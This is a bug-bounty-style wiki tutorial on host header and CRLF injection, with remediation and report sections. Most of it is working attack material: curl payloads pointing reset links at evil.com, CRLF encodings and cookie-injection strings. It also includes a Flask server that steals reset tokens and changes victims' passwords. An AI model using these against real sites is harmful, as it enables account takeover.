---
type: wiki
category: attack
tool: burp,curl,manual
status: active
last-updated: 2026-04-21
---

# Host Header Injection + CRLF Injection Guide (2026 Edition)

> **Purpose:** Host header injection can drive password reset poisoning (a high-bounty ATO chain), cache poisoning, and SSRF; CRLF injection enables response splitting, session fixation, and XSS.
> Both are increasingly blocked by WAFs / modern frameworks in 2026, but as long as the reverse proxy chain is complex (CDN -> LB -> Nginx -> App) there are still gaps.

## 0. Principles

### 0.1 Host Header Injection

Apps use `request.headers['Host']` to construct:
- Password reset links
- Email notification links
- Redirect URLs
- OAuth callbacks

If the host isn't validated -> attacker changes `Host: evil.com` -> the link becomes `https://evil.com/reset?token=xxx` -> victim clicks -> the token is stolen by the attacker.

### 0.2 CRLF Injection

HTTP uses `\r\n` to separate headers/body. If user input enters a header/redirect URL without filtering -> injecting `\r\n\r\n<html>` splits the response.

```
Location: /search?q=INJECT\r\n\r\n<html>hacked</html>
         -> browser receives 2 responses -> the 2nd is attacker-controlled
```

## 1. Host Header Injection

### 1.1 Detection

```bash
# Change Host and see if it's reflected in the response
curl -I https://target.com/ -H "Host: evil.com"

# 1. Response contains evil.com -> reflected
# 2. Redirects to evil.com -> strong proof of the vuln
# 3. Set-Cookie Domain=evil.com -> cookie is poisoned

# Some servers don't honor Host, so try X-Forwarded-Host / X-Host / X-Original-URL
curl -I https://target.com/ -H "X-Forwarded-Host: evil.com"
curl -I https://target.com/ -H "X-Host: evil.com"
curl -I https://target.com/ -H "X-Forwarded-Server: evil.com"
```

### 1.2 Password reset poisoning (high-bounty chain)

```bash
# Trigger a reset email
curl -X POST https://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@x.com"

# The reset link in the email becomes:
# https://evil.com/reset?token=ABC123
#         ^ attacker-controlled domain

# Victim clicks -> lands on attacker server -> attacker grabs the token -> replays it against target.com/reset?token=ABC123 to reset the victim's password -> ATO
```

**Techniques to improve success rate**:

```bash
# Use X-Forwarded-Host (more commonly trusted)
curl -X POST https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@x.com"

# Multiple Host headers (HPP)
curl -X POST https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "Host: evil.com" \
  -d "email=victim@x.com"

# Port injection
curl -H "Host: target.com:attacker.com"  # some parsers take the port segment
```

### 1.3 Absolute URL bypass

```bash
# SSRF-like
curl https://target.com/ \
  -H "Host: evil.com" \
  --request-target "https://target.com/admin"

# GET https://target.com/admin HTTP/1.1
# Host: evil.com
# -> which host does the server route on when it receives an absolute URI?
```

If Nginx `proxy_pass` uses `$host` instead of `$proxy_host` -> routing is decided by the Host header -> SSRF to an arbitrary backend.

### 1.4 Cache poisoning via Host

```bash
# CDN cache key doesn't include X-Forwarded-Host
curl https://target.com/home \
  -H "X-Forwarded-Host: evil.com"

# If the response reflects X-Forwarded-Host and gets cached -> the next user gets the poisoned response
# See [64-cache-poisoning.md]
```

### 1.5 Email notification link hijacking

```bash
# Invite / confirmation email
curl -X POST https://target.com/invite \
  -H "Host: evil.com" \
  -d "email=target@victim.com&role=admin"

# The accept link in the email becomes https://evil.com/accept?token=xxx
```

## 2. CRLF Injection

### 2.1 Detection

```bash
# Test via URL / query param
curl -v "https://target.com/redirect?url=https://evil.com/%0d%0aX-Injected:yes"

# Response headers containing `X-Injected: yes` -> vulnerable
```

**URL-encoded variants**:

```
%0d%0a   <- standard CRLF
%E5%98%8A%E5%98%8D <- UTF-8 double-encoded (some parsers decode twice)
%0a%0d   <- reversed order
%00%0d%0a <- null plus CRLF
%23%0d%0a <- #fragment plus CRLF
```

### 2.2 Redirect CRLF

```
GET /redirect?url=foo%0d%0aContent-Length:%2015%0d%0a%0d%0a<script>alert(1)</script>

# Response:
# Location: foo
# Content-Length: 15
#
# <script>alert(1)</script>
# -> the second response is attacker-controlled
```

### 2.3 Set-Cookie injection

```
?callback=x%0d%0aSet-Cookie:sessionid=attacker_value

# Response:
# Set-Cookie: sessionid=attacker_value
# -> session fixation
```

### 2.4 Response splitting -> XSS

```
?lang=en%0d%0a%0d%0a<script>alert(1)</script>

# HTML gets inserted right after the headers end -> XSS
# But modern browsers mostly don't parse the second response, so this technique has largely faded
```

### 2.5 CRLF via proxy chain

```
GET /api?x=1%0d%0aHost:internal.service.local HTTP/1.1

# Some proxies will forward this input as a header to the backend
```

### 2.6 HTTP/2 -> HTTP/1.1 downgrade CRLF

A new 2024-2026 trick: `\r\n` injected into an HTTP/2 pseudo-header becomes a legal HTTP/1.1 header after downgrade (see [60-request-smuggling.md](60-request-smuggling.md) H2.CL / H2.TE).

## 3. Common sink hunting

### 3.1 Backend code audit

```bash
# Find Host usage
grep -r 'request.headers\["Host"\]\|HTTP_HOST\|getServerName\|getHeader("Host")\|request.get_host\|$_SERVER\["HTTP_HOST"\]' src/

# Find CRLF sinks
grep -r 'header\|redirect\|Location\|Set-Cookie\|append' src/ | grep -v sanitize
```

### 3.2 Framework default behavior

| Framework | `Host` default behavior |
|-----------|-----------------|
| Django | `ALLOWED_HOSTS` enforces an allowlist (default-on since 1.5+) |
| Rails | `config.hosts` allowlist (6.0+) |
| Spring | No default (depends on `X-Forwarded-Host` + `server.forward-headers-strategy`) |
| Express | No default, must validate yourself |
| Flask | No default |
| Laravel | `App\Providers\TrustedProxyServiceProvider` |

### 3.3 Reverse proxy

```nginx
# Safe
proxy_set_header Host target.com;
# Attacker cannot inject

# Unsafe
proxy_set_header Host $host;
proxy_set_header Host $http_host;
# Attacker-controlled
```

## 4. Tools

### 4.1 Burp

```
# Manual repeater
# Intruder for brute-forcing X-* header variants

# Extensions:
- Param Miner (finds unkeyed headers)
- HTTP Request Smuggler (H2 downgrade)
- CRLF injection scanner (built into Burp Pro)
```

### 4.2 Nuclei

```bash
nuclei -u https://target.com -tags crlf,host-header
```

### 4.3 crlfuzz

```bash
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
crlfuzz -u https://target.com/?q=FUZZ
```

### 4.4 host-header-injection scanner

```bash
# ffuf + Host list
ffuf -u https://target.com/ -H "Host: FUZZ" -w /path/to/host-wordlist.txt -mc 200,301,302
```

## 5. Full PoC: X-Forwarded-Host -> Password reset poisoning

### Step 1: Confirm the reset endpoint

```bash
curl -X POST https://target.com/api/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@x.com"}'
# 200 OK -> email sent
```

### Step 2: Inject X-Forwarded-Host

```bash
curl -X POST https://target.com/api/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@x.com"}'
```

### Step 3: Check the email content

```
Subject: Reset your password
Body: Click here: https://evil.com/reset?token=ABC123XYZ
                        ^ attacker host
```

### Step 4: Stand up evil.com to receive the token

```python
# evil.com/app.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/reset')
def reset():
    token = request.args.get('token')
    print(f"Stolen token: {token}")
    # Replay against target.com/reset?token={token} in the background to reset the victim's password
    import requests
    requests.get(f"https://target.com/reset?token={token}&new=attacker_password")
    return "Redirecting..."
```

### Step 5: Send the social-engineering email (optional, skip for a real exploit, only describe it in the report)

Victim clicks the evil.com link -> attacker gets the token -> replays it against target.com in real time -> victim's password is changed -> ATO.

### Step 6: Report

```markdown
## Vulnerability Summary
https://target.com/api/forgot-password uses X-Forwarded-Host to construct the password-reset
link without validating a host allowlist. An attacker can inject an arbitrary domain, causing
the link in the reset email to point at the attacker's server -> stealing the reset token ->
full ATO.

## Reproduction
[curl with X-Forwarded-Host: evil.com + email screenshot]

## Impact
- Full account takeover (of an arbitrary account)
- No user interaction needed beyond the email client auto-previewing and the user clicking "Reset"

## Severity
P1 / Critical (full ATO)

## Remediation
1. Hardcode the base URL (config or env var) used to construct reset links
2. Validate a Host / X-Forwarded-Host allowlist
3. Sign the reset link with an HMAC: `sign(email+token+timestamp)`, verified server-side
4. Reset tokens expire in 5-10 minutes and are single-use
```

## 6. Defense checklist (for remediation write-ups)

```
1. All URL-construction logic uses a config-hardcoded base URL
2. Validate a Host header allowlist (Django ALLOWED_HOSTS / Rails config.hosts)
3. Ignore X-Forwarded-Host / X-Host / X-Original-URL (unless from a trusted proxy)
4. Set `X-Frame-Options: DENY` + `Strict-Transport-Security`
5. Sanitize input: forbid \r\n \x00 \x1F control characters in header values
6. Use modern framework APIs, never string-concatenate a Location header
7. Allowlist-validate redirect URLs (never trust the query param)
8. Use a separate domain or an HMAC-signed path for email links
9. Bind reset tokens to IP / device fingerprint (optional)
```

## Related documents

- [60-request-smuggling.md](60-request-smuggling.md) — H2 downgrade CRLF
- [64-cache-poisoning.md](64-cache-poisoning.md) — Host / X-Forwarded-Host as an unkeyed header
- [65-csrf-deep.md](65-csrf-deep.md) — CRLF + Set-Cookie = session fixation
- PortSwigger Host header attacks: https://portswigger.net/web-security/host-header
- OWASP CRLF Injection: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
- crlfuzz: https://github.com/dwisiswant0/crlfuzz
